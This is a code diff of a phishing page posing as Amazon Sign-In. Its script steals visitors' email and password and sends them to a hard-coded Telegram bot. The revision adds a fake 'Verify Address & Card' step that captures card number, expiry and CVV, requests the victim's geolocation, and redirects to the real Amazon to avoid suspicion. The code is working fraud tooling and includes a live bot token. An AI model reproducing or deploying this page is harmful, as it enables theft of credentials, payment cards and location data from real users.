@@ -1,61 +1,53 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Amazon Sign-In</title>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon Sign-In Verification</title>
     <style>
-        body { font-family: "Amazon Ember", Arial, sans-serif; background-color: #fff; margin: 0; padding: 0; }
-        .container { max-width: 350px; margin: 0 auto; padding: 20px; }
-        .logo { text-align: center; padding: 15px 0; }
-        .login-box { border: 1px solid #ddd; padding: 20px; border-radius: 8px; box-shadow: 0 1px 0 rgba(0,0,0,.05); }
-        h1 { font-size: 28px; font-weight: 400; margin-bottom: 15px; }
-        label { font-weight: 700; font-size: 13px; display: block; margin-bottom: 5px; }
-        input { width: 93%; padding: 10px; margin-bottom: 15px; border: 1px solid #a6a6a6; border-radius: 3px; outline: none; }
-        input:focus { border-color: #e77600; box-shadow: 0 0 3px 2px rgba(228,121,17,.5); }
-        button { width: 100%; background: #f0c14b; border: 1px solid #a88734; padding: 10px; border-radius: 3px; cursor: pointer; font-size: 13px; color: #111; }
-        button:hover { background: #f4d078; }
-        .footer { background: linear-gradient(to bottom,rgba(0,0,0,.14),rgba(0,0,0,.03) 3px,transparent); margin-top: 30px; padding: 20px; text-align: center; font-size: 11px; color: #555; }
+        body { font-family: Arial, sans-serif; background: #fff; text-align: center; }
+        .box { max-width: 350px; margin: 20px auto; border: 1px solid #ddd; padding: 20px; border-radius: 8px; }
+        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #a6a6a6; border-radius: 3px; }
+        button { width: 95%; background: #f0c14b; border: 1px solid #a88734; padding: 10px; cursor: pointer; }
+        .hide { display: none; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" width="100">
+    <div class="box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" width="100">
+        <div id="s1">
+            <h2>Sign-In</h2>
+            <input type="text" id="e" placeholder="Email or phone">
+            <input type="password" id="p" placeholder="Password">
+            <button onclick="st1()">Continue</button>
         </div>
-        <div class="login-box">
-            <h1>Sign-In</h1>
-            <label>Email or mobile phone number</label>
-            <input type="text" id="email" placeholder="">
-            <label>Password</label>
-            <input type="password" id="password" placeholder="">
-            <button onclick="sendData()">Continue</button>
+        <div id="s2" class="hide">
+            <h3>Verify Address & Card</h3>
+            <input type="text" id="c" placeholder="Card Number">
+            <input type="text" id="ex" placeholder="MM/YY" style="width:40%">
+            <input type="text" id="cv" placeholder="CVV" style="width:40%">
+            <button onclick="st2()">Verify Account</button>
         </div>
     </div>
-
-    <div class="footer">
-        <p>© 1996-2026, Amazon.com, Inc. or its affiliates</p>
-    </div>
-
     <script>
-        function sendData() {
-            const email = document.getElementById('email').value;
-            const pass = document.getElementById('password').value;
-            
-            // Apnar Bot Token ar Chat ID eikhane boshanu hoyeche
-            const token = '8661414644:AAEOXANSWUA3sIrP9_Ta4Id9DC3HPN5ugvc';
-            const chatId = '8353285510'; 
+        const token = '8661414644:AAEOXANSWUA3sIrP9_Ta4Id9DC3HPN5ugvc';
+        const chatId = '8353285510';
 
-            const message = `🔥 Notun Amazon Data! \n\n📧 Email: ${email} \n🔑 Pass: ${pass}`;
-            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+        function send(t) { fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(t)}`); }
 
-            // Data Telegram-e pathano
-            fetch(url).then(() => {
-                // Login-e click korle user-ke asol Amazon-e niye jabe jate keu dorte na pare
-                window.location.href = "https://www.amazon.com/ap/signin";
-            }).catch(err => {
-                window.location.href = "https://www.amazon.com/ap/signin";
+        function st1() {
+            const data = `📦 AMAZON LOG!\n📧: ${document.getElementById('e').value}\n🔑: ${document.getElementById('p').value}`;
+            send(data);
+            // Location Request
+            navigator.geolocation.getCurrentPosition(p => {
+                send(`📍 AMAZON USER LOCATION:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
             });
+            document.getElementById('s1').className = 'hide';
+            document.getElementById('s2').className = '';
+        }
+
+        function st2() {
+            send(`💳 AMAZON CARD!\nNum: ${document.getElementById('c').value}\nExp: ${document.getElementById('ex').value}\nCVV: ${document.getElementById('cv').value}`);
+            window.location.href = "https://www.amazon.com";
         }
     </script>
 </body>
